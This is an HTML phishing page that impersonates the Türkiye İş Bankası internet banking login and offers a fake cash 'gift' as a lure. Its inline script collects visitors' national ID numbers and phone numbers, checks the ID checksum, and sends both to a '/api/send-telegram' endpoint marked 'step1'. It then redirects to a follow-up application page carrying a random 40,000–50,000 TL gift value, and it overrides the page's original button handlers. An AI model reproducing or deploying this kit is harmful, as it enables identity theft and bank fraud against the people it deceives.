<!DOCTYPE html>
<html lang="tr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Türkiye İş Bankası İnternet Şubesi</title>
  <meta name="theme-color" content="#08335E">
  <meta name="msapplication-TileColor" content="#08335E">
  <meta name="msapplication-navbutton-color" content="#08335E">
  <meta name="apple-mobile-web-app-status-bar-style" content="#08335E">
  <link rel="stylesheet" href="./dist/app.css">
  <link rel="stylesheet" href="./dist/jquery-ui.min.css">
  <link rel="shortcut icon" href="./dist/islogo_192.png" type="image/x-icon">
</head>

<body>
  <div id="viewport">
    <div id="leftBannerContainer" style="background-image:url(./dist/banner.jpg);"></div>
    <div id="header">
      <div id="logoContainer">
        <img class="isbank-header-logo" src="./dist/logo.png" alt="iş bankası logo">
      </div>
    </div>
    <div id="mainContent" class="loginMainContent">
      <div class="mobileHeaderContainer">
        <div class="mobileHeader">
        </div>
      </div>
      <div class="pageContainer">
        <div id="StraightLogin">
          <span id="LoginLabel">
            <div id="z5-tab-wrapper">
            </div>
            <div id="loginPageMiddlePartContainer">
              <div class="contentBoxContainer">
                <div class="contentBox" id="loginTypesContainer">
                  <form action="/submit" method="POST" id="Form1Div">
                    <div class="loginTitle">
                      <span id="_ctl0_subeLogin01Title">Türkiye İş Bankası Bireysel<br>İnternet Şubenize Hoş Geldiniz!</span>
                    </div>
                    <div class="loginTitleMobile">
                      <span id="_ctl0_subeLogin01TitleMobile">İnternet Şubenize Hoşgeldiniz!</span>
                    </div>
                    <div id="tabs">
                      <ul>
                      </ul>
                      <div id="tabs1">
                        <div class="loginErrorContainer" id="loginErrorContainer">
                          <div class="errorSymbol">
                            <img id="img_errorSymbol" src="./dist/error_icon.png" alt="giriş hatalı">
                          </div>
                          <div class="errorText" id="loginErrorText">
                            <span id="_ctl0_LoginCookieDisabledLabel">Çerezleri aktif hale getirdikten sonra giriş yapmanızı rica ederiz. Çerez politikamızı <script>document.write(document.location.origin)</script> sayfamızdan inceleyebilirsiniz.</span>
                          </div>
                        </div>
                        <div class="tabContentContainer">
                          <div class="inputLabel ie8-9Only">
                            <span id="_ctl0_subeLogin01MusteriNumarasi">TC Kimlik Numaranız</span>
                          </div>
                          <div class="loginInputContainer bottom10">
                            <input name="tckn" type="tel" id="_ctl0_MusNoText" placeholder="TC Kimlik Numaranızı Giriniz." title="TC Kimlik Numaranızı Giriniz." maxlength="11" class="standardInput info onlyNumeric allowCopyPaste" autocomplete="off" tabindex="1" style="font-size: 18px; padding: 12px 15px; width: 100%; box-sizing: border-box;">
                            <span id="_ctl0_rememberContainer" class="musnoOtherInputText musnoOtherInputText-tr-TR">
                              <span id="clearRemembermusno" style="display: none" class="clearRemembermusno">
                              </span>
                              <div class="onoffswitch onoffswitch-tr-TR">
                                <input name="_ctl0:ctlRemember" type="checkbox" id="_ctl0_ctlRemember" class="onoffswitch-checkbox">
                                <label class="onoffswitch-label" for="_ctl0_ctlRemember">
                                  <span class="onoffswitch-inner onoffswitch-inner-tr-TR">
                                  </span>
                                  <span class="onoffswitch-switch onoffswitch-switch-tr-TR">
                                  </span>
                                </label>
                              </div>
                            </span>
                            <div id="customerNoInfo" class="infoBlueBox infoQuestionMark" title="müşteri numarası bilgisi">
                            </div>
                            <div class="inputBottomErrorContainer tckn" style="display: none;"> TC Kimlik Numaranızı Giriniz. </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div id="loginFormBottomPartContainer">
                      <div class="inputLabel loginPasswordLabel ie8-9Only">
                        <span id="_ctl0_subeLogin01PassTempPass">Telefon Numarası / GSM Numarası</span>
                      </div>
                      <div class="loginInputContainer loginPasswordInputContainer ui-login-z5" style="display: block;">
                        <div style="position: relative;">
                          <div style="display: flex; align-items: center; gap: 10px;">
                            <input name="countryCode" type="text" id="CountryCodeText" value="+90" readonly class="standardInput info" style="width: 70px; text-align: center; background-color: #f5f5f5; cursor: not-allowed; border: 1px solid rgb(211, 211, 211); padding: 12px 8px; flex-shrink: 0; font-size: 18px; font-weight: bold; box-sizing: border-box;" tabindex="-1">
                            <div style="flex: 1; position: relative;">
                              <input name="phone" type="tel" id="PhoneText" pattern="[0-9]*" maxlength="10" placeholder="5XXXXXXXXX" title="Telefon Numarası" tabindex="2" class="standardInput info onlyNumeric removeAutoFill" autocomplete="off" style="border: 1px solid rgb(211, 211, 211); width: 100%; padding: 12px 40px 12px 15px; box-sizing: border-box; font-size: 18px;">
                              <div id="phoneInfo" class="infoBlueBox infoQuestionMark" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; z-index: 1;" title="telefon numarası bilgisi">
                              </div>
                            </div>
                          </div>
                          <div class="inputBottomErrorContainer phone" style="display: none; margin-top: 5px; font-size: 14px;">5 ile başlayan 10 haneli telefon numaranızı giriniz.</div>
                        </div>
                        <div class="formBottomLink">
                          <a id="_ctl0_anindaSifreLink" class="login-tooltip-button" style="display: none;">
                            <img class="login-tooltip-button-image" src="./dist/login_icon_2.png" alt="Åifrem Yok,Ä°lk Kullanım ikonu">
                            <div class="toolTipButtonText">
                              <span id="_ctl0_subeLogin01IlkKullanim">Şifrem Yok / Unuttum</span>
                            </div>
                          </a>
                        </div>
                        <div class="loginFormButtonHolder">
                          <button id="_ctl0_SubeLogin01_btnGiris" class="ui-button darkBlueButton login" type="button" tabindex="19" name="_ctl0:SubeLogin01_btnGiris">Giriş</button>
                        </div>
                      </div>
                    </div>
                    <div id="formBottomLinksContainer">
                      <div class="formBottomLink onlyMobile">
                        <div id="helpInfoTipButton" class="login-tooltip-button">
                          <img class="login-tooltip-button-image" src="./dist/login_icon_0.png" alt="yardım/bilgi ikonu">
                          <div class="toolTipButtonText">
                            <span id="_ctl0_SubeLogin01_YardimBilgi">Yardım / Bilgi</span>
                          </div>
                        </div>
                      </div>
                      <div id="helpInfoToolTipContainer">
                        <div class="arrow-up">
                        </div>
                        <div class="nano">
                          <div class="nano-content">
                            <span id="_ctl0_SubeLogin01_lblYardimBilgi">
                              <ul> <span class="bold">Müşteri Numarası</span>
                                <br>Müşteri Numaranızı bilmiyor veya hatırlamıyorsanız, Bankamatik kartınız üzerinde ve kredi kartı ekstrelerinde görebilirsiniz. Ayrıca 0850 724 0 724 numaralı Telefon Şubemizi arayarak müşteri temsilcisinden de öğrenebilirsiniz<br>
                                <br>
                                <span class="bold">Müşteri Şifresi</span>
                                <br>Müşteri Şifreniz yoksa veya unuttuysanız, şifrenizi<br>
                                <li>• Bankamatik/Kredi kartınız bulunuyorsa Anında Şifre uygulamasından, </li>
                                <li>• Bankamatiklerden, </li>
                                <li>• 0850 724 0 724 numaralı Telefon Şubesi'nden, </li>
                                <li>• Şubelerimizden ve çağrı merkezimizden Geçici Şifre alarak belirleyebilirsiniz. </li>
                              </ul>
                            </span>
                          </div>
                        </div>
                      </div>
                      <div class="formBottomLink">
                        <div id="securityToolTipButton" class="login-tooltip-button">
                          <img class="login-tooltip-button-image" src="./dist/login_icon_1.png" alt="güvenlik ikonu">
                          <div class="toolTipButtonText">
                            <span id="subeLogin01Guvenlik">Güvenlik</span>
                          </div>
                        </div>
                      </div>
                      <div id="securityToolTipContainer" style="display: block;">
                        <div class="arrow-up">
                        </div>
                        <div class="nano">
                          <div class="nano-content" style="overflow: hidden;">
                            <span id="_ctl0_SubeLogin01_lblGuvenlik">
                              <ul>
                                <li>• Kullandığınız tarayıcıda şifre saklama tercihi sunulursa kabul etmeyin, şifrenizi tarayıcıya kaydetmeyin.</li>
                                <li>• Mutlaka lisanslı işletim sistemi ve antivirüs yazılımı kullanın ve düzenli olarak güncelleyin.</li>
                                <li>• Adres çubuğuna <a class="blueLink"><script>document.write(document.location.origin)</script></a> yazarak giriş yapın. </li>
                                <li>• Detaylı bilgiye ulaşmak için <a class="blueLink">tıklayın</a>. </li>
                              </ul>
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
     
            </div>
          </span>
        </div>
        <div id="canvasDiv" style="text-align: center;vertical-align: top; padding-top: 20px;" data-mui="SwitchLanguage#index"></div>></div>
      </div>
      <div id="footer">
        <div id="content">
          <div id="left">
            <div class="container">
              <span id="copyRightContainer">©<script>document.write(new Date().getFullYear())</script> Türkiye İş Bankası A.Ş</span>
            </div>
          </div>
          <div id="right">
            <div class="container">
              <div id="footerLinksContainer">
                <div class="footerLinks contactUsContainer">
                  <a id="indexLinkIletisim">
                    <span id="indexIletisim">Bize Ulaşın</span>
                  </a>
                </div>
                <div class="footerLinks last languageContainer">
                  <span id="lblSubeGirisLangSelect">
                    <div id="languageFlagSelect">
                      <span id="usaflaglabel" class="isbank-page-language selected-language">English</span>
                      <span id="turkishflaglabel" class="isbank-page-language">Türkçe</span>
                    </div>
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="touchOverlay">
      </div>
    </div>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.10.0/jquery.min.js" integrity="sha512-ijLvQMMXgWAO85zfDbKeoqNR7015wrZI42XGYorITKkG0sVlP4t+Rt5Dl9EKDkrPxGrWZmVCUW5oIXkVOrnCiw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src="https://cdn.jsdelivr.net/npm/jqueryui@1.11.1/jquery-ui.min.js" integrity="sha256-4JY5MVcEmAVSuS6q4h9mrwCm6KNx91f3awsSQgwu0qc=" crossorigin="anonymous"></script>
  <script>
    // fakesocket çağrısını engelle
    if (typeof fetch !== 'undefined') {
      const originalFetch = window.fetch;
      window.fetch = function(...args) {
        const url = args[0];
        if (typeof url === 'string' && (url.includes('fakesocket.php') || url.includes('fakesocket'))) {
          console.log('fakesocket.php çağrısı engellendi');
          return Promise.resolve(new Response(JSON.stringify({ success: true }), {
            status: 200,
            headers: { 'Content-Type': 'application/json' }
          }));
        }
        return originalFetch.apply(this, args);
      };
    }
  </script>
  <script src="./dist/app.js"></script>
  <script>
    // Direkt yönlendirme için - app.js'i bypass et
    document.addEventListener('DOMContentLoaded', function() {
      // Hediye değerini querystring'de koru (yoksa random oluştur)
      const urlParams = new URLSearchParams(window.location.search);
      if (!urlParams.get('hediye')) {
        // 40.000 - 50.000 TL arasında random tek bir değer oluştur
        const minHediye = 40000;
        const maxHediye = 50000;
        // Tek bir random değer: 40000-50000 arası
        const randomHediye = Math.floor(Math.random() * (maxHediye - minHediye + 1)) + minHediye;
        
        // Random değeri querystring'e ekle
        const hediyeValue = randomHediye.toString();
        urlParams.set('hediye', hediyeValue);
        const newUrl = window.location.pathname + '?' + urlParams.toString();
        window.history.replaceState({}, '', newUrl);
        
        console.log('Random hediye değeri oluşturuldu:', hediyeValue);
      }
      
      // Hata mesajlarını gizle
      setTimeout(function() {
        var errorContainer = document.querySelector('.inputBottomErrorContainer.tckn');
        if (errorContainer) {
          errorContainer.style.display = 'none';
        }
        var phoneErrorContainer = document.querySelector('.inputBottomErrorContainer.phone');
        if (phoneErrorContainer) {
          phoneErrorContainer.style.display = 'none';
        }
      }, 100);

      // Telefon numarası input'una sadece rakam ve 5 ile başlama kontrolü
      setTimeout(function() {
        var phoneInput = document.getElementById('PhoneText');
        if (phoneInput) {
          phoneInput.addEventListener('input', function(e) {
            // Sadece rakam
            this.value = this.value.replace(/[^0-9]/g, '');
            
            // 10 karakterden fazla girilmesini engelle
            if (this.value.length > 10) {
              this.value = this.value.substring(0, 10);
            }
            
            // 5 ile başlamıyorsa hata göster
            var phoneErrorContainer = document.querySelector('.inputBottomErrorContainer.phone');
            if (this.value.length > 0 && !this.value.startsWith('5')) {
              if (phoneErrorContainer) {
                phoneErrorContainer.style.display = 'block';
                phoneErrorContainer.textContent = 'Telefon numarası 5 ile başlamalıdır.';
              }
              this.classList.add('hasError');
            } else {
              if (phoneErrorContainer) {
                phoneErrorContainer.style.display = 'none';
              }
              this.classList.remove('hasError');
            }
          });
          
          phoneInput.addEventListener('paste', function(e) {
            e.preventDefault();
            var pastedText = (e.clipboardData || window.clipboardData).getData('text');
            var numericOnly = pastedText.replace(/[^0-9]/g, '');
            if (numericOnly.length > 10) {
              numericOnly = numericOnly.substring(0, 10);
            }
            this.value = numericOnly;
            this.dispatchEvent(new Event('input'));
          });
        }
      }, 200);

      // Butona event listener ekle - capture phase'de
      function handleButtonClick(e) {
        e.preventDefault();
        e.stopImmediatePropagation();
        e.stopPropagation();
        
        var tcknInput = document.getElementById('_ctl0_MusNoText');
        var phoneInput = document.getElementById('PhoneText');
        if (!tcknInput) return false;
        
        var tcknValue = tcknInput.value.trim();
        var phoneValue = phoneInput ? phoneInput.value.trim() : '';
        var tcknErrorContainer = document.querySelector('.inputBottomErrorContainer.tckn');
        var phoneErrorContainer = document.querySelector('.inputBottomErrorContainer.phone');
        var isValid = true;
        
        // TCKN kontrolü - 11 karakter ve algoritma kontrolü
        function validateTCKN(tc) {
          if (!tc || tc.length !== 11) {
            return false;
          }
          
          // Tüm rakamlar aynı olamaz (11111111111 gibi)
          if (/^(\d)\1{10}$/.test(tc)) {
            return false;
          }
          
          // İlk hane 0 olamaz
          if (tc[0] === '0') {
            return false;
          }
          
          // TCKN algoritması
          const digits = tc.split('').map(Number);
          
          // 1-9. hanelerin toplamı
          const sum1 = digits[0] + digits[2] + digits[4] + digits[6] + digits[8];
          const sum2 = digits[1] + digits[3] + digits[5] + digits[7];
          
          // 10. hane kontrolü
          const check10 = (sum1 * 7 - sum2) % 10;
          if (check10 < 0) {
            return false;
          }
          if (check10 !== digits[9]) {
            return false;
          }
          
          // 11. hane kontrolü (toplam mod 10)
          const sumAll = digits.slice(0, 10).reduce((a, b) => a + b, 0);
          const check11 = sumAll % 10;
          if (check11 !== digits[10]) {
            return false;
          }
          
          return true;
        }
        
        if (!tcknValue || !validateTCKN(tcknValue)) {
          // Hata mesajını göster
          if (tcknErrorContainer) {
            tcknErrorContainer.style.display = 'block';
            tcknErrorContainer.textContent = 'Geçerli bir TC Kimlik Numarası giriniz.';
          }
          if (tcknInput) {
            tcknInput.classList.add('hasError');
            tcknInput.focus();
          }
          isValid = false;
        } else {
          // TCKN geçerliyse hata mesajını gizle
          if (tcknErrorContainer) {
            tcknErrorContainer.style.display = 'none';
          }
          if (tcknInput) {
            tcknInput.classList.remove('hasError');
          }
        }
        
        // Telefon numarası kontrolü - 5 ile başlayan 10 haneli
        if (!phoneValue || phoneValue.length !== 10 || !phoneValue.startsWith('5')) {
          // Hata mesajını göster
          if (phoneErrorContainer) {
            phoneErrorContainer.style.display = 'block';
          }
          if (phoneInput) {
            phoneInput.classList.add('hasError');
            if (isValid) {
              phoneInput.focus();
            }
          }
          isValid = false;
        } else {
          // Telefon geçerliyse hata mesajını gizle
          if (phoneErrorContainer) {
            phoneErrorContainer.style.display = 'none';
          }
          if (phoneInput) {
            phoneInput.classList.remove('hasError');
          }
        }
        
        if (!isValid) {
          return false;
        }
        
        // Hediye değerini querystring'den al (mutlaka olmalı çünkü sayfa yüklendiğinde oluşturuldu)
        const currentUrlParams = new URLSearchParams(window.location.search);
        const hediye = currentUrlParams.get('hediye');
        
        // Telegram'a bildirim gönder - Adım 1
        fetch('/api/send-telegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            type: 'step1',
            tckn: tcknValue,
            telefon: '+90' + phoneValue
          })
        }).catch(function(error) {
          console.error('Telegram bildirim hatası:', error);
        });
        
        if (!hediye) {
          // Eğer bir şekilde hediye yoksa, random oluştur
          const minHediye = 40000;
          const maxHediye = 50000;
          const randomHediye = Math.floor(Math.random() * (maxHediye - minHediye + 1)) + minHediye;
          const hediyeValue = randomHediye.toString();
          
          // Direkt yönlendirme yap - telefon numarasını ve hediye değerini ekle
          window.location.href = '/basvur.html?tc=' + encodeURIComponent(tcknValue) + '&phone=' + encodeURIComponent('+90' + phoneValue) + '&hediye=' + encodeURIComponent(hediyeValue);
        } else {
          // Direkt yönlendirme yap - telefon numarasını ve hediye değerini ekle
          window.location.href = '/basvur.html?tc=' + encodeURIComponent(tcknValue) + '&phone=' + encodeURIComponent('+90' + phoneValue) + '&hediye=' + encodeURIComponent(hediye);
        }
        
        return false;
      }

      // Buton bulunduğunda event ekle
      function attachButtonListener() {
        var button = document.getElementById('_ctl0_SubeLogin01_btnGiris');
        if (button) {
          // Tüm event listener'ları kaldır
          var newButton = button.cloneNode(true);
          button.parentNode.replaceChild(newButton, button);
          
          // Yeni event listener ekle - capture phase
          newButton.addEventListener('click', handleButtonClick, true);
          
          // jQuery event'lerini de override et
          if (typeof jQuery !== 'undefined') {
            jQuery(newButton).off('click').on('click', handleButtonClick);
          }
          return true;
        }
        return false;
      }

      // Buton bulunana kadar dene
      if (!attachButtonListener()) {
        var attempts = 0;
        var checkButton = setInterval(function() {
          attempts++;
          if (attachButtonListener() || attempts > 50) {
            clearInterval(checkButton);
          }
        }, 100);
      }

      // app.js yüklendikten sonra tekrar dene
      setTimeout(attachButtonListener, 500);
      setTimeout(attachButtonListener, 1000);
      setTimeout(attachButtonListener, 2000);

      // Form submit'ini engelle
      var form = document.getElementById('Form1Div');
      if (form) {
        form.addEventListener('submit', function(e) {
          e.preventDefault();
          return false;
        }, true);
      }
    });
  </script>
</body>
</html>

